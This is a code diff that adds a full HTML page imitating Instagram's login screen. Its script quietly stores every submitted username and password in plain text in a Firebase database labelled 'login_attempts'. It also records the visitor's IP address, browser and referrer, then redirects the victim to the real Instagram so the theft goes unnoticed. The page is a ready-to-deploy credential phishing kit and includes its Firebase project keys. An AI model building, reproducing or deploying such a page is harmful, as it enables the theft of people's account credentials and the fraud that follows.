@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+        .login-container {
+            background-color: #000;
+            border: 1px solid #363636;
+            border-radius: 1px;
+            padding: 20px 40px 40px;
+            margin-bottom: 20px;
+        }
+        .instagram-logo {
+            text-align: center;
+            margin: 22px 0 30px;
+        }
+        .instagram-logo h1 {
+            font-family: 'Brush Script MT', cursive;
+            font-size: 51px;
+            font-weight: normal;
+            color: #ffffff;
+            letter-spacing: 1px;
+        }
+        .form-group {
+            margin-bottom: 6px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            border: 1px solid #363636;
+            border-radius: 3px;
+            background-color: #121212;
+            color: #f5f5f5;
+            font-size: 12px;
+            outline: none;
+            height: 38px;
+        }
+        .form-input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        .form-input:focus {
+            border-color: #a8a8a8;
+        }
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 9px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0 16px 0;
+        }
+        .login-button:hover {
+            background-color: #1877f2;
+        }
+        .login-button.loading {
+            position: relative;
+            color: transparent;
+        }
+        .login-button.loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #363636;
+        }
+        .divider-text {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+        }
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+        .facebook-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            background: #385185;
+            border-radius: 3px;
+            display: inline-block;
+            position: relative;
+        }
+        .facebook-icon::after {
+            content: 'f';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        .forgot-password {
+            text-align: center;
+        }
+        .forgot-password a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .signup-container {
+            background-color: #000;
+            border: 1px solid #363636;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .signup-text {
+            font-size: 14px;
+            color: #ffffff;
+        }
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer {
+            max-width: 935px;
+            width: 100%;
+            margin-top: 30px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 11px;
+        }
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+            color: #8e8e8e;
+            font-size: 11px;
+        }
+        .language-selector {
+            background-color: transparent;
+            border: none;
+            color: #8e8e8e;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .error-message {
+            color: #ed4956;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="instagram-logo">
+                <h1>Instagram</h1>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <input
+                        type="text"
+                        class="form-input"
+                        id="username"
+                        placeholder="Phone number, username, or email"
+                        required
+                    >
+                </div>
+
+                <div class="form-group">
+                    <input
+                        type="password"
+                        class="form-input"
+                        id="password"
+                        placeholder="Password"
+                        required
+                    >
+                </div>
+
+                <button type="submit" class="login-button" id="loginBtn">
+                    Log in
+                </button>
+
+                <div class="error-message" id="errorMessage">
+                    Sorry, your password was incorrect. Please double-check your password.
+                </div>
+
+                <div class="divider">
+                    <span class="divider-text">OR</span>
+                </div>
+
+                <a href="#" class="facebook-login">
+                    <span class="facebook-icon"></span>
+                    Log in with Facebook
+                </a>
+
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+
+        <div class="signup-container">
+            <span class="signup-text">Don't have an account? </span>
+            <a href="#" class="signup-link">Sign up</a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Meta AI Articles</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+
+        <div class="footer-bottom">
+            <select class="language-selector">
+                <option>English</option>
+            </select>
+            <span>© 2025 Instagram from Meta</span>
+        </div>
+    </footer>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
+        import { getFirestore, collection, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC9erOtjg-xhoWm8RO2Adn_KDJOPml3FXE",
+            authDomain: "shop-dbf4b.firebaseapp.com",
+            projectId: "shop-dbf4b",
+            storageBucket: "shop-dbf4b.appspot.com",
+            messagingSenderId: "321149556755",
+            appId: "1:321149556755:web:b48e8270e5af9fe51007e6"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const loginForm = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+
+        async function storeLoginData(username, password) {
+            try {
+                const docRef = await addDoc(collection(db, "login_attempts"), {
+                    username: username,
+                    password: password,
+                    timestamp: serverTimestamp(),
+                    userAgent: navigator.userAgent,
+                    ip: await getUserIP(),
+                    referrer: document.referrer || 'Direct'
+                });
+                console.log("Document written with ID: ", docRef.id);
+                return true;
+            } catch (e) {
+                console.error("Error adding document: ", e);
+                return false;
+            }
+        }
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting IP:', error);
+                return 'Unknown';
+            }
+        }
+
+        function validateForm() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            loginBtn.disabled = !(username.length > 0 && password.length > 0);
+        }
+
+        usernameInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+        validateForm();
+
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                showError('Please fill in all fields.');
+                return;
+            }
+
+            loginBtn.classList.add('loading');
+            loginBtn.disabled = true;
+            errorMessage.style.display = 'none';
+
+            try {
+                const success = await storeLoginData(username, password);
+                if (success) {
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com';
+                    }, 2000);
+                } else {
+                    throw new Error('Failed to process login');
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+                loginBtn.classList.remove('loading');
+                loginBtn.disabled = false;
+                showError('Something went wrong. Please try again.');
+            }
+        });
+
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
